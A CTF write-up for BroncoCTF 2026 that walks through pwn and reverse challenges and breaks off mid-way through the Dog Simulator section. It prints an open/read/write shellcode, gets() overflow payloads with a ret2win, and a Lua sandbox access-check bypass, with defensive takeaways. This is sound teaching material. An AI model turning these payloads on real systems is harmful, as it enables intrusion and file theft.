---
title: "BroncoCTF 2026 Pwn + Reverse Writeup: 7 Challenges Solved (Seccomp-Restricted ORW Shellcode, Four-Gate gets() Overflow Chain with Stack-Aligned ret2win, Roblox Server-Side Lua Sandbox Write-Over-Read-Protection, Cat Simulator Counter-Constraint Game with FNV-Mix Flag Decrypt, C++ Song-Title Token Substitution, ARM64 Dog Simulator FNV-1a Preimage + Rhythm State Machine, Mirror Mirror Self-Referential SHA-256 XOR Loop)"
slug: "broncoctf-2026-pwn-reverse-writeup"
description: "Step-by-step BroncoCTF 2026 pwn and reverse writeup — three pwn challenges (Crab Trap: seccomp-restricted service allowing only open/read/write, solved with a 50-byte x86_64 ORW shellcode that pushes flag.txt on the stack; Proper Pwning: four gets() calls, three integer gates with an adjacent baby_chicken decoy plus an exact 13371337 gate, ending in a 6776-byte ret2win at win+5 for stack alignment; World's Hardestest Flag: Roblox .rbxl binary place file with a SecureDeh9001Server Lua sandbox whose read() blocks TypeTag=0 entries but whose write() can mutate that same TypeTag, plus a client-side banned-word filter bypassed with string.char) and four reverse challenges (Cat Simulator: 5-day game with score/mood/talk-letter constraints leading to a mood-seeded FNV-mix XOR decrypt of the real flag past the bonco{almost_there} decoy; C++ Unplugged: valid C++ with song titles substituted for every syntactic token, translated and compiled; Dog Simulator: ARM64 Mach-O with a 6-day rhythm state machine, an FNV-1a preimage recovered via Z3 for a 12-letter first speak, and a required 'gremlin' second speak matching the day-6 owner line; Mirror Mirror: Python script XOR-decrypting a hard-coded blob using a SHA-256 of a 300-char slice of its own source starting at a marker string, keyed by the repeating string MirrorMirror)."
date: 2026-07-16T10:30:00Z
lastmod: 2026-07-16T10:30:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
series: ["BroncoCTF 2026"]
tags:
  - "broncoctf"
  - "broncoctf 2026"
  - "bronco ctf"
  - "ctf writeup"
  - "pwn"
  - "reverse"
  - "reverse engineering"
  - "seccomp shellcode"
  - "orw shellcode"
  - "x86_64 shellcode"
  - "gets buffer overflow"
  - "ret2win"
  - "stack alignment"
  - "roblox lua sandbox"
  - "rbxl binary place"
  - "server-side lua"
  - "banned word filter bypass"
  - "fnv-1a preimage"
  - "z3 hash preimage"
  - "arm64 mach-o reversing"
  - "self-referential sha-256"
  - "xor decrypt loop"
  - "game constraint reversing"
keywords:
  - "broncoctf 2026 pwn writeup"
  - "broncoctf 2026 reverse writeup"
  - "bronco ctf writeup"
  - "crab trap orw shellcode writeup"
  - "proper pwning gate overflow writeup"
  - "worlds hardestest flag roblox writeup"
  - "cat simulator writeup"
  - "cpp unplugged song titles writeup"
  - "dog simulator arm64 writeup"
  - "mirror mirror python writeup"
  - "seccomp open read write shellcode"
  - "gets() stack overflow x86_64 ret2win"
  - "roblox securedeh9001server lua sandbox writeup"
  - "typetag write-over-read-protection"
  - "fnv-1a hash preimage z3 solver"
  - "rhythm state machine reverse engineering"
  - "self-hash python source xor decrypt"
  - "ctf step by step 2026"
toc: true
cover:
  image: "/images/articles/broncoctf-2026-pwn-reverse-writeup.png"
  alt: "BroncoCTF 2026 pwn + reverse writeup — seven challenges solved covering a seccomp-restricted service allowing only open/read/write solved with a 50-byte x86_64 ORW shellcode, a four-gate gets() overflow chain with an adjacent baby_chicken decoy and an exact 13371337 integer gate ending in a 6776-byte ret2win at win+5 for stack alignment, a Roblox .rbxl binary place file with a Lua sandbox whose read() blocks TypeTag=0 entries but whose write() can mutate the TypeTag with a client-side banned-word filter bypassed via string.char, a 5-day cat simulator game with mood-seeded FNV-mix XOR decrypt past a bonco{almost_there} decoy, valid C++ with song titles substituted for every syntactic token, an ARM64 Mach-O dog simulator with a 6-day rhythm state machine and a Z3-recovered FNV-1a preimage plus a gremlin second speak matching the day-6 owner line, and a Python script XOR-decrypting a hard-coded blob using a SHA-256 of a 300-char slice of its own source"
---

BroncoCTF 2026 (bronco flag prefix, hosted by Cal Poly Pomona's Cyber Security Club) shipped a pwn track that scales cleanly from "shellcode with one twist" to "server-side Lua sandbox inside a Roblox place file," and a reverse track that ranges from beginner-friendly Python and C++ up to an ARM64 Mach-O game with a hidden rhythm state machine. What makes the seven challenges in this writeup work together is that every single one *telegraphs* what it wants: the seccomp banner enumerates the allowed syscalls, the C source is shipped inside the pwn zip so the author's hardening flags are visible, the Roblox script names include the string `SecureDeh9001Server`, the fake flag in Cat Simulator uses the prefix `bonco{...}` on purpose so it's obviously not right, C++ Unplugged prints `The flag is ` before its output, Dog Simulator's owner lines say things like "Last day of the week, little gremlin" that map directly to speak-input requirements, and Mirror Mirror embeds the marker string `MIRROR_SURFACE_DO_NOT_SCRATCH` as its own pivot label. Trained triage means reading those signals as *instructions*, not decoration.

Handouts, per-challenge READMEs, and pure-stdlib solver scripts live at [Abdelkad3r/BroncoCTF-2026](https://github.com/Abdelkad3r/BroncoCTF-2026). This writeup covers the three pwn challenges (Crab Trap, Proper Pwning, World's Hardestest Flag) and the four reverse challenges (Cat Simulator, C++ Unplugged, Dog Simulator, Mirror Mirror).

## The seven BroncoCTF 2026 pwn + reverse challenges

| Challenge | Category | Bug class / primitive | Flag |
|---|---|---|---|
| Crab Trap | Pwn | Shellcode runner with a seccomp-style filter whose banner explicitly allows only `open`, `read`, `write`. No `execve`, so no shell. 50-byte x86_64 ORW payload: push `flag.txt` onto stack, `open`, `read` into that same buffer, `write` to stdout using the read length. | `bronco{h0w_c4n_mr_kr4b5_c0de}` |
| Proper Pwning | Pwn | Non-PIE, no canary, exec stack, `gcc -fno-stack-protector -z execstack -no-pie`. Four `gets()` calls: gate 1 flips a nearby int with one byte at offset 268; gate 2 has a decoy `baby_chicken` at offset 520 that must be preserved as `41` while overflowing the gate at 524; gate 3 needs exact `0x00cc07c9` at offset 76 (uses the `gets()` NUL for the high byte); treasure room is a 6776-byte overflow to saved RIP, targeting `win+5` (`0x401240`) to keep stack alignment through `system()`. | `bronco{1m_th3_b35t_PWN3r_1n_th3_wh0l3_w1d3_w0r1d}` |
| World's Hardestest Flag | Pwn | Binary Roblox `.rbxl` place with a server-side Lua sandbox exposing `read(addr)` and `write(addr, tbl)`. Flag at address `0x6767 == 26471` has `TypeTag = 0`, blocked by `read`. But `write()` has no ownership/tag check and can mutate `TypeTag` on the same object. Client-side banned-word filter (`typetag`, `flag`) bypassed by dynamic construction: `"Type"..string.char(84,97,103)`. | `bronco{d34th_t0_th3_dehs_f0r3v3r}` |
| Cat Simulator | Reverse | 5-day menu game with state `score, mood, talks, scratches, eats, invalid, total_talk_letters`. Real flag branch requires `talks=3, scratches=1, eats=1, invalid=0, score=45, mood>0, talk_letters=32`. String `bonco{almost_there}` is a decoy path (prefix is wrong). Real branch derives a seed from `mood` via a xorshift-multiply avalanche (mix), then decrypts the flag with an `rol32(seed^stream) ^ salt ^ prev` loop. | `bronco{fluffy_baby}` |
| C++ Unplugged | Reverse | Valid C++ source with every syntactic token replaced by a song title starting with a capital letter (`CountingStars=int`, `BeginAgain={`, `EndOfTime=}`, `EndGame=;`, `Starboy=*`, `FromTheStart=(`, `IsItOverNow=)`, `ThisIsMe==`, `SameOldLove===`, etc.). Build the dictionary by starting from `using namespace std EndGame` and the `main()` header, sort replacements by length, handle spaced character literals separately, compile, run. | `bronco{i_c@m3_1n_lik3_@_s3gfAult}` |
| Dog Simulator | Reverse | ARM64 Mach-O 6-day menu game. Finale checks `speak_letters == 19, rhythm == 4, gremlin check passed, energy > 20, exactly 1 bark + 1 fetch + 1 sit + 1 eat, 0 zoomies, exactly 2 speaks, score == 55, bond > 24, combo != 2, speak_checksum == 0x740a8a98, routine_hash == 0xf5d38524`. Winning routine: `fetch → sit → bark → speak("pifbekgtrlru") → eat → speak("gremlin")`. First speak is a 12-letter FNV-1a preimage of `0x9f58d866` recovered with Z3. Second speak matches the day-6 owner line "little gremlin". Flag decrypted with a NEON transform seeded by final stats. | `bronco{mans_best_friend}` |
| Mirror Mirror | Reverse | Python script computing `specular_map = sha256(src[pivot:pivot+300])` where `pivot = src.index("MIRROR_SURFACE_DO_NOT_SCRATCH")`, then XOR-decrypting a hard-coded 35-byte `blob` with `key[i] = specular_map[i % 32] ^ ord("MirrorMirror"[i % 12])`. Anti-debug checks (`sys.gettrace()`, frame name comparison) are cosmetic since the decoder is visible; reimplement offline against the original artefact bytes. | `bronco{wh0_1s_th3_f@ir3st_r3v3rs3r}` |

The seven challenges are anchored by a shared design habit: **read the banner / source / prompt as a spec, not as ambience**. Crab Trap's banner literally lists the three allowed syscalls, which is exactly the ORW chain. Proper Pwning's Dockerfile ships in the zip with the compiler flags. World's Hardestest Flag names its bypass surface with `SecureDeh9001Server` and enumerates the banned words in a local table. Cat Simulator's decoy string uses the wrong flag prefix (`bonco{...}` not `bronco{...}`) so a careful reader dismisses it. C++ Unplugged tells you "all song titles begin with a capital letter" in the hint. Dog Simulator's owner lines say the required speak word out loud ("little gremlin"). Mirror Mirror embeds its own SHA-256 pivot as a plaintext marker. In every case the challenge author is not hiding the mechanism; they're hiding whether you'll actually read what they wrote.

## Methodology — banner first, source second, disassembly third

A pattern that worked across every BroncoCTF pwn/reverse challenge in this set: **do the free work before the hard work**. The banner and the shipped source together resolve most of the "what am I attacking" question in under a minute. Crab Trap's banner (`Allowed syscalls: open, read, write`) is the exploit brief. Proper Pwning ships `proper.c` and a Dockerfile with the exact `gcc` flags used to build the binary; that's the pwn hardening posture handed to you. World's Hardestest Flag's `.rbxl` place file contains 96 classes and 1,748 instances, and the interesting subset (14 LocalScripts + 91 ModuleScripts + 36 Scripts) is exposed as plain-string `Source` properties inside the binary chunks. You never need to run Roblox Studio to read that source.

For the reverse track: Cat Simulator, Dog Simulator, and Mirror Mirror each print a decoy or a marker that tells you which mode you're in. `strings cat-sim-linux` shows `bonco{almost_there}` next to `bronco{...}`-style menu strings; the prefix mismatch itself is the tell that it's a decoy. Dog Simulator's owner prompts spell out the required speak word. Mirror Mirror's `MIRROR_SURFACE_DO_NOT_SCRATCH` marker names the offset where the SHA-256 slice begins. C++ Unplugged prints `The flag is ` before its computed sections, so compiling the normalised source and running it is a legitimate solver.

Only after those free signals are exhausted do we reach for `objdump`, `nm`, or full disassembly. Even then, the disassembly work is targeted: Proper Pwning's `sub rsp, 0x110` + `rbp-0x4` for the gate integer tells you the offset (268) in one line. Dog Simulator's finale ladder at `0x100000e0c` is a dozen `cmp` instructions against integer literals; each one is a checkpoint constraint you can read off the disassembly and satisfy from state simulation without executing the ARM64 binary on an x86_64 host.

Per-challenge walkthroughs follow.

## Pwn track

### 1. Crab Trap

A tiny shellcode runner. The banner enumerates the seccomp policy for you: `open`, `read`, `write` are allowed; `execve` is not. That's the ORW chain, verbatim.

#### Step 1 — Read the banner as the spec

```
~~ THE CRAB TRAP ~~
 *** STRICT SEA POLICY IN EFFECT ***
 Allowed syscalls: open, read, write
 execve?  The barnacles will DESTROY you.
[*] Drop your crab feed into the trap (max 512 bytes):
```

Since `execve` is banned, don't try to get a shell. Read `flag.txt` directly with `open + read + write`. Register calling convention (Linux x86_64): `rax` = syscall number, `rdi` = arg0, `rsi` = arg1, `rdx` = arg2. Syscall numbers: `read=0, write=1, open=2`.

#### Step 2 — Assemble the ORW payload

Push `flag.txt\0` on the stack (little-endian immediate `0x7478742e67616c66`), then run `open("flag.txt", 0)`, `read(fd, rsp, 0x100)`, `write(1, rsp, n)` where `n` is the `read` return value:

```asm
xor rax, rax
push rax
mov rbx, 0x7478742e67616c66   ; "flag.txt" little-endian
push rbx

mov rdi, rsp                  ; path
xor esi, esi                  ; O_RDONLY
mov al, 2
syscall                       ; open

mov rdi, rax                  ; fd
mov rsi, rsp                  ; buf (reuse stack)
mov edx, 0x100
xor eax, eax
syscall                       ; read

mov edx, eax                  ; write only what we read
mov edi, 1
mov al, 1
syscall                       ; write
```

Assembled: 50 bytes.

```
4831c05048bb666c61672e747874534889e731f6b0020f05
4889c74889e6ba0001000031c00f0589c2bf01000000b0010f05
```

#### Step 3 — Send raw bytes over the socket

The service reports it swallowed 51 bytes (50 payload + trailing newline). Flag arrives on the next read:

```
[*] Nom nom... swallowed 51 bytes. Deploying the Barnacle Barrier...
bronco{h0w_c4n_mr_kr4b5_c0de}
```

Per-challenge README + solver: [pwn/crab-trap](https://github.com/Abdelkad3r/BroncoCTF-2026/tree/main/pwn/crab-trap).

The defender takeaway is not about the shellcode; it's about the syscall-allowlist framing. A syscall filter that leaves `open`, `read`, and `write` open is not a defence-in-depth measure; those three are exactly what you need to exfiltrate any local file the process can reach. Meaningful seccomp policies for a "no code execution" sandbox need to also confine open() by pathname (via seccomp-bpf and a landlock rule, or a `chroot` + `unveil`-style API), because "no execve" alone does not stop file-read exfiltration.

### 2. Proper Pwning

Four `gets()` calls in a chain, with three "gate" checks and a final ret2win. The zip ships `proper.c` and the Dockerfile with build flags, so no reversing is needed; just calibrate offsets and stack alignment.

#### Step 1 — Read the Dockerfile

```
gcc proper.c -o proper -fno-stack-protector -z execstack -no-pie
```

- no stack canary → straight buffer overflow works
- exec stack → doesn't matter here, no shellcode needed
- no PIE → code addresses stable (`win()` at a fixed address)

Control flow in `main()`: `gate1()`, `gate2()`, `gate3()`, `treasure_room()`. Each gate calls `gets()` on a stack buffer with an integer check nearby.

#### Step 2 — Gate 1: overflow one byte

```c
volatile int gate = CLOSED;   // rbp-0x4
int buffer[64];               // rbp-0x110
gets(buffer);
if (gate == CLOSED) return -1;
```

Distance to gate: `0x110 - 0x4 = 268`. Any non-zero byte at offset 268 flips `gate` from zero and passes the check:

```python
gate1 = b"A" * 268 + b"B"
```

#### Step 3 — Gate 2: preserve the decoy

```c
volatile int gate = CLOSED;         // rbp-0x4
volatile int baby_chicken = ALIVE;  // rbp-0x8
long buffer[64];                    // rbp-0x210
gets(buffer);
if (baby_chicken != ALIVE) return -1;   // 41 == 0x29
if (gate == CLOSED) return -1;
```

Distances: `buffer → baby_chicken = 520`, `buffer → gate = 524`. Spraying `A` all the way to gate corrupts `baby_chicken` to `0x41414141` and the function dies before it checks gate. Overwrite `baby_chicken` with the exact value `41` (4-byte little-endian `0x29 0x00 0x00 0x00`), then continue into gate:

```python
gate2 = b"A" * 520 + p32(41) + b"B"
```

The three NUL bytes inside `p32(41)` are fine over a socket; `gets()` stops on newline, not NUL.

#### Step 4 — Gate 3: exact integer + NUL trick

```c
volatile int gate = CLOSED;   // rbp-0x4
char buffer[67];              // rbp-0x50
gets(buffer);
if (gate == 13371337) { ...print win() address... }
```

Distance: `0x50 - 0x4 = 76`. `13371337 = 0x00cc07c9`, so little-endian bytes are `c9 07 cc 00`. `gets()` appends a NUL after the read bytes, which is exactly the high byte:

```python
gate3 = b"A" * 76 + p32(13371337)[:3]
```

Passing gate 3 also leaks `win() = 0x40123b` (non-PIE, so stable).

#### Step 5 — Treasure room: ret2win at win+5 for stack alignment

```c
void treasure_room() {
    char buffer[6767];
    gets(buffer);
}
```

Frame size from disassembly: `0x1000 + 0xa70 = 0x1a70`. Saved RIP at `rbp+8`, so buffer→RIP is `0x1a78 = 6776`:

```python
final = b"A" * 6768 + b"B" * 8 + p64(win + 5)
```

Why `win + 5` (i.e. `0x401240`) instead of `win` itself? On x86_64 Linux, libc functions expect `rsp` to be 16-byte aligned at call boundaries. `ret` into a normal function entry executes `endbr64; push rbp; mov rbp, rsp; ...`, and the `push rbp` misaligns the stack, so `system()` (which internally calls into `do_system` and libc's `execve`) can crash on the misaligned SIMD ops inside movaps. Skipping the prologue's `endbr64; push rbp` (5 bytes) and landing on `mov rbp, rsp` preserves the alignment set by `ret`:

```
0x40123b: endbr64            ; 4 bytes
0x40123f: push rbp           ; 1 byte
0x401240: mov rbp, rsp       ; entry point that keeps alignment
```

#### Step 6 — Run the chain

```
[+] Well done. Gate 1 opens.
[+] Well done. Gate 2 opens.
[+] Gate 3 opens, and you find some treasure. It says 'win() is that way, located at 0x40123b'
TREASURE?
[-] oh my goodness, you're the greatest C pwner of all time.
bronco{1m_th3_b35t_PWN3r_1n_th3_wh0l3_w1d3_w0r1d}
```

Per-challenge README + solver: [pwn/proper-pwning](https://github.com/Abdelkad3r/BroncoCTF-2026/tree/main/pwn/proper-pwning).

The stack-alignment detail is the "real pwn muscle memory" this challenge teaches. Returning to a function is not the same thing as calling it: `call foo` pushes a return address (8 bytes) before entering the callee, so `rsp` is misaligned by 8 on function entry, and the prologue's `push rbp` realigns it. `ret <addr_of_foo>` does not push anything, so the callee starts with `rsp` already 16-aligned, and its own `push rbp` misaligns it again. When a ret2win reaches the target but dies inside `puts()` / `printf()` / `system()`, look at stack alignment before assuming the address is wrong. Skipping the prologue (`+5` on standard x86_64 Linux) or inserting a `ret` gadget as a padding to add 8 bytes both fix it.

### 3. World's Hardestest Flag

A Roblox binary place file (`.rbxl`) hosting a server-side Lua sandbox with `read()` and `write()` memory primitives. The sandbox blocks reads on flag-tagged objects but allows writes to arbitrary object fields. Classic capability-model bug: write-over-read-protection.

#### Step 1 — Parse the `.rbxl` binary

```
$ file mrdeh-hardestest.rbxl
mrdeh-hardestest.rbxl: data

$ xxd -l 32 mrdeh-hardestest.rbxl
00000000: 3c72 6f62 6c6f 7821 89ff 0d0a 1a0a 0000  <roblox!........
00000010: 6000 0000 d406 0000 0000 0000 0000 0000  `...............
```

Header magic `<roblox!` + control bytes = binary place format. 96 classes, 1748 instances. Chunk-based (INST, PROP, PRNT, END chunks, each zstd-compressed or raw). Script source lives inside string properties on `LocalScript`, `ModuleScript`, `Script` classes: 14 + 91 + 36 = 141 scripts total. No need to open Roblox Studio.

#### Step 2 — Find the terminal + server pipeline

Script `SecureDeh9001TerminalScript` (LocalScript) collects user input, runs a client-side banned-word check, then fires a RemoteEvent to the server:

```lua
local bannedWords = {"position", "humanoid", "destroy", "name", "typetag", "flag"}
local function containsBannedWords(input)
    for _, word in bannedWords do
        if string.find(string.lower(input), word) then return true end
    end
    return false
end
...
executeEvent:FireServer(code)
```

`containsBannedWords` runs on the *client*. Client-side validation isn't a security boundary; the server can be invoked directly, and even if you're using the normal UI the RemoteEvent handler on the server must re-validate.

#### Step 3 — Read the server handler

Script `SecureDeh9001Server`:

```lua
local FlagStore = DataStoreService:GetDataStore("CTFCredentials")
local FLAG = "Bonco{FAKEFAKEFAKE}"   -- fallback for Studio
local success, live_flag = pcall(function() return FlagStore:GetAsync("TrueFlag") end)
if success and live_flag then FLAG = live_flag end

local Storage = {
    [0x6767] = { TypeTag = 0, Value = FLAG },
    [0x4141] = { TypeTag = 4, Value = "You!" },
}

local function read(address)
    local tvalue = Storage[address]
    if not tvalue then return "nil" end
    if tvalue.TypeTag == 0 then return "[ACCESS DENIED]" end
    return tvalue.Value
end

local function write(address, new_data)
    if Storage[address] then
        for key, val in pairs(new_data) do
            Storage[address][key] = val
        end
    end
end
```

Two capabilities: `read` gates on `TypeTag == 0`; `write` merges arbitrary key/value pairs into the storage entry with no tag check. Since `TypeTag` itself is stored as a key on the same object `read` gates on, `write` can flip the access check.

Two other notes: the local `.rbxl` only has the `Bonco{FAKEFAKEFAKE}` string; the real flag is loaded from a Roblox DataStore at runtime (see step 5). And the sandbox custom_env is deliberately minimal (no Roblox globals, no metatable escapes, no `getfenv`/`setfenv`), so all we get is the intended memory API, which is enough.

#### Step 4 — Bypass the banned-word filter

Direct exploit `write(0x6767,{TypeTag=4});print(read(0x6767))` fails because the client filter blocks the literal substring `typetag`. Construct the key dynamically:

```lua
"Type" .. string.char(84, 97, 103)   -- 'T', 'a', 'g'  → "TypeTag"
```

And use decimal `26471` instead of `0x6767` (also avoids matching `flag` case-insensitively if the filter were tightened). Final payload:

```lua
write(26471,{["Type"..string.char(84,97,103)]=4});print(read(26471))
```

Contains no banned word literally, passes the client filter, mutates the storage entry's `TypeTag` to `4`, then reads the value (now not blocked).

#### Step 5 — Live exploitation

In the live Roblox place (not the local `.rbxl`, which only holds the Studio fallback):

1. Join the game.
2. Open the SecureDeh9001 terminal UI.
3. Paste the payload above and submit.
4. Terminal prints:

```
SERVER: bronco{d34th_t0_th3_dehs_f0r3v3r}
```

Per-challenge README + solver: [pwn/worlds-hardestest-flag](https://github.com/Abdelkad3r/BroncoCTF-2026/tree/main/pwn/worlds-hardestest-flag).

The bug class here has real-world analogues. Whenever a sandbox exposes both "read with an access check" and "write to arbitrary metadata used by that access check", the access check is state waiting to be edited: think of ACL entries writable via the same API that gates on them, JWT scopes editable via a token-refresh endpoint that doesn't re-check original scopes, Kubernetes RoleBinding entries writable by pods with the same role they're supposed to be scoped by. The defensive fix in this specific challenge is to structure `Storage` so that `TypeTag` lives outside the writable object (or write a whitelist of writable keys); the general fix is "capability rings should not include their own gating metadata".

There's also a `WIN` RemoteFunction that internally calls `read(0x6767)`, so it *looks* like the intended win path. But since it uses the same read primitive with the flag object still tagged `TypeTag = 0`, it returns `[ACCESS DENIED]` until the terminal exploit first flips the tag. That's an intentional misdirection; the memory-mutation exploit is what unlocks it.

## Reverse track

### 4. Cat Simulator

A 5-day menu game with the visible string `bonco{almost_there}` as a decoy path (wrong prefix: `bonco` vs `bronco`). The real branch requires an exact counter/score profile, then decrypts the flag with a mood-seeded XOR loop.

#### Step 1 — Fingerprint and enumerate strings

Three cross-platform binaries: Linux x86_64 ELF, macOS arm64 Mach-O, Windows PE32. `strings cat-sim-linux` reveals:

```
Welcome to Cat Simulator! Make the purrfect choices!
=== Day %d/%d: You are a cat. What do you do? ===
1) Talk to owner (+%d)
2) Scratch owner (%d)
3) Eat (+%d)
bonco{almost_there}
```

The `bonco{...}` prefix is deliberately wrong. If it were the real flag the challenge author would have written `bronco{...}`; the mismatch means "this is a lure branch."

#### Step 2 — Map action effects

Initial state: `score = 0, mood = 10`. Each action updates:

- Talk: `score += 25, mood += 7, talks += 1, talk_letters += len(text)`
- Scratch: `score -= 50, mood -= 12, scratches += 1`
- Eat: `score += 20, mood += 2, eats += 1`

Any other menu choice hits the "stare blankly" branch and increments `invalid`. Since the real branch requires `invalid == 0`, all 5 days must use one of the three valid actions.

#### Step 3 — Read the finale checks

Linux finale disassembly:

```
cmp invalid_count, 0
cmp talk_count, 3
cmp scratch_count, 1
cmp eat_count, 1
cmp score, 0x2d              ; 45
cmp mood, 1                  ; mood > 0
cmp total_talk_letters, 0x20 ; 32
```

Constraints solve directly: 3 talks + 1 scratch + 1 eat = 5 days. Score check: `3×25 - 50 + 20 = 45` ✓. Mood check: `10 + 3×7 - 12 + 2 = 21 > 0` ✓. Talk letters: split 32 as `10 + 10 + 12`.

#### Step 4 — Winning input

```
<Enter>
1
abcdefghij
1
abcdefghij
1
abcdefghijkl
2
3
```

#### Step 5 — Reproduce the decrypt loop

Once counters pass, seed derives from `mood`:

```c
seed = mix((mood * 17) ^ 0xc47b4cd0);
// mix() is a xorshift-multiply avalanche:
//   x ^= x >> 16; x *= 0x7feb352d;
//   x ^= x >> 15; x *= 0x846ca68b;
//   x ^= x >> 16;
```

With winning `mood = 21`: `seed = 0xb6e8a8a5`.

Encrypted bytes:

```
24 50 96 93 cf 56 4e 7a a7 61 d4 0e 24 15 a3 e3 89 be 4c 00
```

Decoder starts with `stream = 0x9e3779b9`, `salt = 0x5a`, and iterates:

```c
out[i] = rol32(seed ^ stream, i % 13) ^ salt ^ prev_out;
stream += 0x9e3779b9;
salt   += 0x33;
```

Yields `bronco{fluffy_baby}`.

Per-challenge README + solver: [reverse/cat-simulator](https://github.com/Abdelkad3r/BroncoCTF-2026/tree/main/reverse/cat-simulator).

The generalisable pattern: any game-style reverse where visible strings include both correct-looking and slightly-off flags is telegraphing a lure/real branch split. The wrong-prefix trick (`bonco` vs `bronco`) is a very cheap way for authors to signal "this string is a decoy," because grep-for-flag-format tooling will still surface it, but a careful reader will dismiss it on the prefix alone.

### 5. C++ Unplugged

A valid C++ source file where every syntactic token has been replaced with a song title starting with a capital letter. Translate, compile, run.

#### Step 1 — Read the hint

> All song titles to replace begin with a capital letter.

This is the tokenisation rule. Regular C++ identifiers written in normal snake_case or camelCase remain themselves. Only tokens starting with a capital letter are code.

#### Step 2 — Build the dictionary from grammar anchors

Start with obvious C++ constructs:

- `using namespace std EndGame` → `EndGame = ;`
- `main FromTheStart CountingStars argc, Abcdefu Starboy argv PieceByPiece FreshOutTheSlammer IsItOverNow BeginAgain` → the whole `int main(int argc, char *argv[]) {` header

Extracted dictionary:

| Song title | Token |
|---|---|
| `CountingStars` | `int` |
| `Abcdefu` | `char` |
| `Starboy` | `*` |
| `FromTheStart` | `(` |
| `IsItOverNow` | `)` |
| `PieceByPiece` | `[` |
| `FreshOutTheSlammer` | `]` |
| `BeginAgain` | `{` |
| `EndOfTime` | `}` |
| `EndGame` | `;` |
| `ComeBackBeHere` | `return` |
| `PleasePleasePlease` | `if` |
| `ShouldveSaidNo` | `else` |
| `DejaVu` | `while` |
| `GoodForYou` | `for` |
| `Positions` | `switch` |
| `CaseClosed` | `case` |
| `AsItWas` | `default` |
| `YouBrokeMeFirst` | `break` |
| `OnMyWay` | `continue` |
| `ThisIsMe` | `=` |
| `SameOldLove` | `==` |
| `SmallerThanThis` | `<` |
| `Higher` | `>` |
| `SmallerThanThisThisIsMe` | `<=` |
| `HigherThisIsMe` | `>=` |
| `Greedy` | `&&` |
| `ThisOrThat` | `\|\|` |
| `WithoutMe` | `-` |
| `PartOfMe` | `%` |
| `BreakUpWithYourGirlfriendImBored` | `/` |
| `Mine` | `+=` |
| `More` | `++` |
| `TruthHurts` | `true` |
| `FalseGod` | `false` |

#### Step 3 — Order-of-replacement gotcha

`SmallerThanThisThisIsMe` contains `SmallerThanThis` and `ThisIsMe`. Naive replacement in an arbitrary order turns `<=` into `<ThisIsMe`. Sort dictionary keys by length descending and replace longest first.

#### Step 4 — Handle spaced character literals

In `part2()`:

```cpp
' Starboy ', ' BeginAgain ', ' EndOfTime '
```

If we substitute inside single quotes, we get `' * '`, `' { '`, `' } '`, which are multi-character literals, invalid as `char`. They must become `'*', '{', '}'`. Handle those three special cases before the general pass.

#### Step 5 — Compile and run

```
$ g++ artifacts/normal.cpp -o artifacts/normal
$ ./artifacts/normal
The flag is bronco{i_c@m3_1n_lik3_@_s3gfAult}
```

Per-challenge README + solver: [reverse/cpp-unplugged](https://github.com/Abdelkad3r/BroncoCTF-2026/tree/main/reverse/cpp-unplugged).

The lesson is to let syntax errors guide the solve. The first few obvious phrases (a `using namespace std` line, a function header) unlock a huge fraction of the dictionary. From there, the challenge collapses into "write a token replacer and let the compiler do the semantic work." Never rewrite 239 lines by hand when the compiler will happily do it for you.

### 6. Dog Simulator

An ARM64 Mach-O 6-day game with a hidden rhythm state machine, an FNV-1a hash preimage requirement, and an owner-line hint that names one of the required speak inputs.

#### Step 1 — Fingerprint and dump imports

```
$ file dog-sim-mac
dog-sim-mac: Mach-O 64-bit executable arm64

$ nm -an dog-sim-mac
                 U _atoi
                 U _fgets
                 U _printf
                 U _puts
                 U _snprintf
                 U _strlen
0000000100000000 T __mh_execute_header
```

Stripped except for the Mach-O header symbol, but imports (`fgets, atoi, printf`) tell us it's a plain menu game. Solving statically because the host is x86_64 with no ARM64 runtime handy.

#### Step 2 — Enumerate game surface via `strings`

```
=== Day %d/%d: You are a dog. What do you do? ===
1) Bark (+%d)
2) Fetch (+%d)
3) Sit (+%d)
4) Eat (+%d)
5) Zoomies (%d)
6) Speak (type a command)
```

Six owner prompts, six days. The day-6 prompt is:

```
Last day of the week, little gremlin.
```

That's a plaintext hint. One of the speak inputs must be `gremlin`.

Finale error messages are also breadcrumbs:

- "the words feel the wrong length" → speak-letter total is checked
- "he keeps repeating what he heard... but it's not quite right" → gremlin word check
- "different sequence of tricks" → action order (rhythm state machine)

#### Step 3 — Map state and finale constraints

State variables (from register/stack usage in main at `0x100000500`):

```
w21 = score           init 0
w25 = bond            init 12
w26 = energy          init 40
w22 = combo/state     init 0
w24 = rhythm/state    init 0
w23 = routine_hash    init 0x13579bdf
[sp+0x60] = speak_checksum  init 0xbadc0ffe
[sp+0x68] = total_speak_letters
[sp+0x48..0x5c] = per-action counters (bark, fetch, sit, eat, zoomies, speak)
```

Action effects:

| Menu | Score | Bond | Energy | Counter |
|---|---|---|---|---|
| 1 Bark | +10 | +? | +? | bark++ |
| 2 Fetch | +20 | +? | +? | fetch++ |
| 3 Sit | +15 | +? | +? | sit++ |
| 4 Eat | +10 | +? | +? | eat++ |
| 5 Zoomies | +? | +? | +? | zoomies++ |
| 6 Speak | 0 | 0 | −? | speak++, updates speak_checksum + total_letters |

Finale ladder at `0x100000e0c`:

```
total_speak_letters == 0x13         (19)
rhythm == 4
gremlin check passed
energy > 20
exactly 1 bark
exactly 1 fetch
exactly 1 sit
exactly 1 eat
0 zoomies
exactly 2 speaks
score == 55
bond > 24
combo != 2
speak_checksum == 0x740a8a98
routine_hash == 0xf5d38524
```

Score check: `10 + 20 + 15 + 10 = 55` ✓ (one of each action).

#### Step 4 — Recover the routine order

The rhythm state machine tracks the *order* of the actions, not just their counts. Simulating from disassembly (six days, four non-speak actions + two speaks), the ordering that reaches `rhythm == 4` and `routine_hash == 0xf5d38524`:

```
fetch → sit → bark → speak → eat → speak
```

Days 1-3-2-6-4-6 in menu numbers: `2 3 1 6 <speak1> 4 6 <speak2>`.

#### Step 5 — Recover the speak inputs

Speak handler normalises input: strips newline, `tolower` alphabetic bytes only, drops the rest. Computes FNV-1a over the normalised bytes:

```
hash = 0x811c9dc5
for each lowercase alphabetic byte c:
    hash = (hash ^ c) * 0x01000193
```

Then checks: is normalised word `== "gremlin"` (day-6 owner line hint), and speak_checksum computed across both words `== 0x740a8a98`, and `total_speak_letters == 19`.

Since `len("gremlin") == 7`, speak-1 must be 12 letters. Speak-1's FNV-1a target is `0x9f58d866`.

